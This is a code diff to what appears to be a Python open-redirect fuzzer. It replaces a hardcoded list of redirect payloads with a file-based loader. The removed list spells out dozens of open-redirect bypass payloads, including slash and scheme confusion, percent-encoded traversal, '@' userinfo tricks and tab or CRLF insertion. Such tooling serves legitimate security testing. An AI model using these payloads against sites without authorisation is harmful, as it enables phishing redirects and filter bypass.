@@ -6,6 +6,7 @@ import argparse
 import sys
 import socket
 import random
+from pathlib import Path
 from aiohttp import ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects
 from tqdm import tqdm
 import concurrent.futures
@@ -18,92 +19,7 @@ LIGHT_GREEN = '\033[92m'  # Light Green
 DARK_GREEN = '\033[32m'   # Dark Green
 ENDC = '\033[0m'          # Reset to default color
 
-redirect_payloads = [
-    # Scheme-relative and slash confusion
-    "//example.com",
-    "///example.com",
-    "////example.com",
-    "/////example.com",
-    "////example.com/",
-    "//example.com/",
-    "//example.com/%2f..",
-    "//example.com/%2f%2e%2e",
-    "//example.com/%2e%2e",
-    "//example.com/%252f..",
-    "//example.com/%252e%252e",
-    "/%2f%2fexample.com",
-    "/%2f%2fexample.com/",
-    "/%2F%2Fexample.com/%2e%2e",
-    "/%5cexample.com",
-    "/%5c%5cexample.com",
-    "/\\example.com",
-    "/\\\\example.com",
-    "/./example.com",
-    "/../example.com",
-    "/.example.com",
-    "/..;/example.com",
-    "/;/example.com",
-    "/%2e/example.com",
-    "/%2e%2e/example.com",
-    "/%2e%2e%2fexample.com",
-    "/%2e%2e%5cexample.com",
-    # Scheme confusion and mixed slash payloads
-    "http://example.com",
-    "https://example.com",
-    "https:/example.com",
-    "http:/example.com",
-    "/http://example.com",
-    "/https://example.com",
-    "/https://example.com/",
-    "/https://example.com/%2e%2e",
-    "/https://example.com/%2f..",
-    "/https://example.com//",
-    "/https:///example.com",
-    "/https:///example.com/%2e%2e",
-    "/https:///example.com/%2f%2e%2e",
-    "/https:example.com",
-    "/https:/%5cexample.com/",
-    "/https://%5cexample.com",
-    "/https://%09/example.com",
-    # Userinfo and delimiter abuse
-    "//example.com@google.com/%2f..",
-    "///example.com@google.com/%2f..",
-    "https://example.com@google.com/%2f..",
-    "/https://example.com@google.com/%2f..",
-    "//example.com@google.com/%2f%2e%2e",
-    "///example.com@google.com/%2f%2e%2e",
-    "//example.com%40google.com",
-    "//example.com%2F@google.com",
-    "//example.com%23@google.com",
-    "//example.com%3f@google.com",
-    "////\\;@example.com",
-    "////;@example.com",
-    "//google.com/%2f..",
-    "///google.com/%2f..",
-    "////google.com/%2f..",
-    "https://google.com/%2f..",
-    "/https://google.com/%2f..",
-    "//google.com/%2f%2e%2e",
-    "///google.com/%2f%2e%2e",
-    "////google.com/%2f%2e%2e",
-    # Tab/newline/control-char variations
-    "//%09/example.com",
-    "///%09/example.com",
-    "////%09/example.com",
-    "//%0d%0a/example.com",
-    "/%09/example.com",
-    "/%0d/example.com",
-    "/%0a/example.com",
-    # Query/fragment tricks used in redirect sinks
-    "//example.com#",
-    "//example.com/%23",
-    "//example.com?#",
-    "//example.com?next=/",
-    "//example.com?redirect=/",
-    "https://example.com#@google.com",
-    "https://example.com?@google.com",
-    "https://example.com/%09@google.com",
-]
+DEFAULT_PAYLOADS_FILE = Path(__file__).with_name("payloads.txt")
 
 RANDOM_USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
@@ -135,12 +51,10 @@ def apply_external_server(payloads: List[str], external_server: str) -> List[str
 
 
 async def load_payloads(payloads_file, external_server):
-    if payloads_file:
-        with open(payloads_file) as f:
-            payloads = [line.strip() for line in f if line.strip()]
-            return apply_external_server(payloads, external_server)
-
-    return apply_external_server(redirect_payloads, external_server)
+    payloads_source = payloads_file if payloads_file else DEFAULT_PAYLOADS_FILE
+    with open(payloads_source) as f:
+        payloads = [line.strip() for line in f if line.strip()]
+    return apply_external_server(payloads, external_server)
 
 
 def fuzzify_url(url: str, keyword: str) -> str:
